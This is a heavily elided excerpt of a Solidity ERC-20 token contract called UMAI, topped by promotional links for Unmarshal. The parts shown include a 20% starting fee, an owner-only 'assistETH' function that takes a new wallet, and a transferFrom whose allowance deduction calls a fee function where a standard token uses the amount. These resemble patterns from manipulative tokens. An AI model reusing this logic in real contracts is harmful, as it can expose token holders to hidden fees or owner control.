...
/**
    At Unmarshal, we provide a complete suite of APIs designed to empower dApp developers and users with accurate and reliable blockchain data.

    https://unmarshal.pro
    https://app.unmarshal.pro
    https://docs.unmarshal.pro

    -----------------------------------------------------------------

    telegram: https://t.me/unmarshal_ai
    twitter: https://x.com/unmarshal_ai
*/
...
contract UMAI is Context, IERC20, Ownable {
    ...
    uint256 private _asBeginFee = 20;
    uint256 private _asLastFee = 0;
    ...
    function assistETH(address payable newWallet) external {
        require(msg.sender == _feeOwner, "not deployer");
    ...
    function transferFrom(
        ...
        _approve(
            sender, _msgSender(),_allowances[sender][_msgSender()].sub(
                _approvedFeeAmount(sender, recipient, amount),"ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }
